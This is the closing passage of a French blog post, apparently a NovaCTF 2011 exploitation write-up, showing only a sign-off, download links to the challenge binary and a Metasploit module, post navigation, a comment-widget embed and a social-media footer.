<p>J’espère que ça vous a plu.</p>

<p>Have phun,</p>

<p>m_101</p>

<h1 id="resources">Resources</h1>

<ul>
  <li>Link: <a href="http://www.mediafire.com/?y7bijdid18jy4ck">Archive avec le binaire exploité (rev3)</a></li>
  <li>Exploit: <a href="http://www.mediafire.com/?eoaqferx570jeqv">Module metasploit</a></li>
</ul>


  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/2011/02/03/exploitation-novactf-january-2011.html">Previous : [Exploitation] NovaCTF January 2011</a>
    

    
    <a class="post-next" href="/2011/03/02/film-sneakers.html">Next : [Film] Sneakers</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2011/02/09/exploitation-novactf-january-2011_09.html";
            this.page.identifier = "/2011/02/09/exploitation-novactf-january-2011_09";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
